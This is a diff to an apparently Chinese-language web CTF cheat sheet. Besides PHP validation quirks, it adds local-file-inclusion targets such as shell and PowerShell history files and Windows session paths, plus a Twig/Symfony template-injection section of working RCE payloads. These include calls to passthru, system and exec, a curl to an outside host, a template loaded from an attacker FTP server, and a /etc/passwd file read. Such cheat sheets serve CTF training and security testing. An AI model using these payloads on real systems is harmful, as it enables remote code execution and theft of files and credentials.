@@ -21,6 +21,7 @@ Table of Contents
     * [Oracle](#oracle)
     * [SQLite](#sqlite)
     * [Postgresql](#postgresql)
+    * [MS Access](#ms-access)
 *  [LFI](#lfi)
 *  [Upload](#上傳漏洞)
 *  [Serialization](#反序列化)
@@ -793,6 +794,12 @@ echo file_get_contents('bar/etc/passwd');
         - False
     - `filter_var('0://evil.com;google.com', FILTER_VALIDATE_URL)`
         - True
+    - ```filter_var('"aaaaa{}[]()\'|!#$%*&^-_=+`,."@b.c',FILTER_VALIDATE_EMAIL) ```
+        - `"aaaaa{}[]()'|!#$%*&^-_=+`,."@b.c` (OK)
+    - `filter_var('aaa."bbb"@b.c',FILTER_VALIDATE_EMAIL)`
+        - `aaa."bbb"@b.c` (OK)
+    - `filter_var('aaa"bbb"@b.c',FILTER_VALIDATE_EMAIL)`
+        - False
 
 - json_decode
     - 不直接吃換行字元和\t字元
@@ -821,7 +828,7 @@ echo file_get_contents('bar/etc/passwd');
 
 - strip_tags (php bug 78814)
     - php version <= 7.4.0
-    - `<s/trong>b</strong>`
+    - `strip_tags("<s/trong>b</strong>", "<strong>")`
         - `<s/trong>b</strong>`
     - Example: [zer0pts CTF 2020 - MusicBlog](https://github.com/w181496/CTF/tree/master/zer0pts2020/MusicBlog)
 
@@ -1709,6 +1716,7 @@ HQL injection example (pwn2win 2017)
     - `$TOMCAT_HOME/logs/catalina.out`
 
 - History
+    - `.history`
     - `.bash_history`
     - `.sh_history`
     - `.zsh_history`
@@ -1786,7 +1794,7 @@ HQL injection example (pwn2win 2017)
 - `%SYSTEMDRIVE%\autoexec.bat`
 - `C:\Documents and Settings\All Users\Application Data\Git\config`
 - `C:\ProgramData\Git\config`
-
+- `$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt`
 
 ## 環境變數
 
@@ -1829,6 +1837,8 @@ HQL injection example (pwn2win 2017)
     - /tmp/
     - /var/lib/php5/
     - /var/lib/php/
+    - C:\windows\temp\sess_<PHPSESSID>
+        - windows
 - `session.upload_progress`
     - PHP預設開啟
     - 用來監控上傳檔案進度
@@ -2252,6 +2262,19 @@ Server-Side Template Injection
 - 用request繞
     - `{{''.__class__}}`
         - `{{''[request.args.kaibro]}}&kaibro=__class__`
+
+## Twig / Symfony
+
+- RCE
+    - `{{['id']|map('passthru')}}`
+    - `{{['id']|filter('system')}}`
+    - `{{app.request.query.filter(0,'curl${IFS}kaibro.tw',1024,{'options':'system'})}}`
+    - `{{_self.env.setCache("ftp://attacker.net:21")}}{{_self.env.loadTemplate("backdoor")}}`
+    - `{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}`
+- Read file
+    - `{{'/etc/passwd'|file_excerpt(30)}}`
+- Version
+    - `{{constant('Twig\\Environment::VERSION')}}`
 
 ## AngularJS
 - v1.6後移除Sandbox
